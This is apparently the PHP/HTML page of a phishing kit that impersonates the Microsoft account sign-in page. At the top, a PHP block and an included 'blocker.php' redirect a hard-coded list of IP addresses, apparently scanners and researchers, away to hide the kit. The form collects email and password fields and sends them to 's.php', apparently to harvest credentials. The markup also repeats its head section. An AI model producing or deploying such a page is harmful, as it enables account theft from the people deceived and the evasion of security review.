<?php 
include('blocker.php');
$deny = array("13.239.62.44", "54.233.137.119", "162.243.187.126", "46.101.94.163", "31.6.58.60", "87.89.48.69", "92.23.59.24", "5.62.41.36", "154.70.155.194", "18.231.48.187", "46.101.94.163", "46.101.119.24", "52.65.198.212", "54.252.230.248", "52.67.159.194", "40.118.205.169", "199.249.230.77", "50.125.66.169", "194.99.104.130", "51.77.0.80", "40.118.205.169", "199.249.230.77", "50.125.66.169", "196.251.88.139", "185.93.2.59", "196.251.88.139", "84.93.42.239", "196.52.84.53", "82.102.27.51", "5.62.41.37", "165.227.0.128", "92.23.56.101", "185.229.190.136", "50.125.67.177", "104.215.89.177", "188.166.98.249", "138.91.146.139", "50.125.67.177", "159.203.0.156", "188.166.63.71", "165.227.163.166", "139.59.4.194", "142.93.74.68", "64.246.187.119", "157.230.173.0", "52.67.130.154", "40.90.218.216", "72.12.194.91", "103.234.220.197", "162.247.74.204", "40.91.75.16", "72.12.194.91", "103.234.220.197", "162.247.74.204", "18.228.44.24", "72.12.194.150.79", "71.189.173.38", "18.228.44.24", "72.12.194.90", "211.25.3.117", "185.104.120.3", "103.234.220.195", "196.52.84.31", "84.92.138.149", "107.155.49.126", "185.93.2.109", "40.91.75.16");

if (in_array ($_SERVER['REMOTE_ADDR'], $deny)) {
   header("location: https://example.com/");
   exit();
} 

?>


<!DOCTYPE html>
<html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">



<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn" />
    <meta name="SiteID" content="" />
    <meta name="ReqLC" content="1033" />
    <meta name="LocLC" content="en-US" />

    
        <link rel="shortcut icon" href="index_files/favicon_a.ico" />
    
    <meta name="robots" content="none" />


</html>

    
    
    <meta name="robots" content="none">




<link rel="stylesheet" type="text/css" href="index_files/converged.v2.login.min.css">

    



</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    
<div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quote;;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;back.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="get" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="s.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl(), &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) }"><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="./index_files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken,
                            altCredHintShown: sharedData.altCredHintShown },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }"><!--  --> <div data-bind="component: { name: &#39;header-control&#39;, params: { serverData: svr } }"><div class="row text-title" id="loginHeader" role="heading"> <div aria-level="1" data-bind="text: title">Sign in</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Email_Example&#39;],
                hintCss: &#39;placeholder&#39; + (!svr.fAllowPhoneSignIn ? &#39; ltr_override&#39; : &#39;&#39;) },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input type="email" name="mail" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Username_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: usernameTextbox.error },
                    attr: inputAttributes" placeholder="someone@example.com " aria-label="Enter your email address"> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true" required="required"> <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: &#39;marching-ants-control&#39;, ariaLabel: str[&#39;WF_STR_ProgressText&#39;]" aria-label="Please wait" style="display: none;"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div><!-- ko withProperties: { '$usernameView': $data } --> <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons"><div data-bind="component: { name: &#39;action-links-control&#39;,
            params: {
                collapseExcessLinks: svr.fCollapseExcessLinks },
            event: {
                menuOpen: actionLinks_onMenuOpen } }"><!--  --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: svr.showCantAccessAccountLink --><!-- ko component: { name: 'action-link-control',
                    event: {
                        load: actionLink_onLoad,
                        focusChange: actionLink_onFocusChange } } --><!-- ko if: isVisible --> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --> <div data-bind="css: { &#39;form-group&#39;: !isMenuLink(), &#39;action-links-menu-item&#39;: isMenuLink }" class="form-group"> <a id="cantAccessAccount" href="" data-bind="
                        text: str[&#39;WF_STR_CantAccessAccount_Text&#39;],
                        hasFocus: hasFocus,
                        click: $usernameView.cantAccessAccount_onClick,
                        attr: { &#39;role&#39;: isMenuLink() ? &#39;menuitem&#39; : null }">Can’t access your account?</a> </div><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig --><!-- /ko --><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --><!-- /ko --><!-- ko if: $usernameView.availableCredsWithoutUsername.length > 0 --><!-- /ko --> <!-- /ko --><!-- ko if: collapseExcessLinks && actionLinks().length > 2 --><!-- /ko --> </div> </div> </div></div><div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.fRepositionFooterButtons, &#39;button-container&#39;: svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --> <!-- /ko --> <div data-bind="
        css: {
            &#39;inline-block&#39;: svr.fRepositionFooterButtons,
            &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next"> </div> </div></div> </div></div><!-- ko if: $usernameView.altCredHintEnabled() && isCredSwitchLinkInMoreOptions() --><!-- /ko --><!-- /ko --><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div><!-- ko if: newSessionMessage --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="4qQgTnDKNPGpFjIyyxWb+iZFSkaqH+YkJssPnR6gDy8=1:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAdNiNtQztFIxgAAjXRCpa5CWZqibnApiIYEiIS6BRLtqhTc_brrMWmrusZ1l1cVVjPIZJSUFxVb6-vmlJTn5-dl6-Wlpmcmpesn5ufr55Yn6OxgZLzAyrmIyNzM2M7M0Mja1MDA3MrM0NLQ01rNMTjUxTTaz0E00NU7WNTE3TdG1SEux1DVMNk1OMzZOTDIyMr3FxO_vWFqSYQQi8osyq1I_MXGm5RflxhfkF5fMYk5wSS5xcst3THd2dAoq8kupCPYMc_SPNM1Iyikxig_LsjAKNXBOdzEs9owK9fRzDwvzNI1KdS_MC0vMq0wMME01Scmocs7KSQ3JjDD0K9ctysw0zksO8vLJDEjzMc9KK3dZxUxU6GxiZgN6OTc_7xQzW35Bal5mygUWxlcsPAasVhwcXAK8EmwKDD9YGBexAkNR4LtR2op8bde2TxX81-tZGE6x6psUBqaH5Ll4-wW4F7hleVZWVoQnaWdGuQVnJxZ6aEdmexUXB-QFmaW7VFrYGloZTmBjnMDG9oKN8QMbYwc7wy5OQtEAAA2"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="6632f710-6fa8-452b-86f2-780fd77f0400"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADXzZ3ifr-GRbDT45zNSEFEl-C_bh9vDXwBpmCPT_JVZD88DwuiI8QRin6Qiyu4ymKd6LEbBmslQA2QYDgiwq5XGFeRcQelzsfPL6GTvioEPgp2OLXK0dpe2APto9DukIKLbb_ofE3pXFwS503FZotevos6swUF0WECuZyXgvvco0NOuVd5i9CjMYsInmHzPQhiDHOZTnSrFh9YDRqxILdj3E9K9jOk882B3A2eXoEZ3Jl8apwMK8-UvQpmyCsRxmWJvbtRdPFxnypbmUaetCqgTCT-ZuHEdj7AuGVKOW3bvPMFsDXZZEBtaKv34Z9r2xw0TQ9OhzQJyFTyGTxogqVXDS2050RHj_ztjS66PzTuR6Ebt-8zY0-HV3R9mLLqOntYK9g5svb5rGub0YvQhX5WIAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1"> <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="102"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;]" aria-label="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="./index_files/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="./index_files/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="./index_files/prefetch.html" style="display: none;"></iframe></div> <!-- /ko --></div></body></html>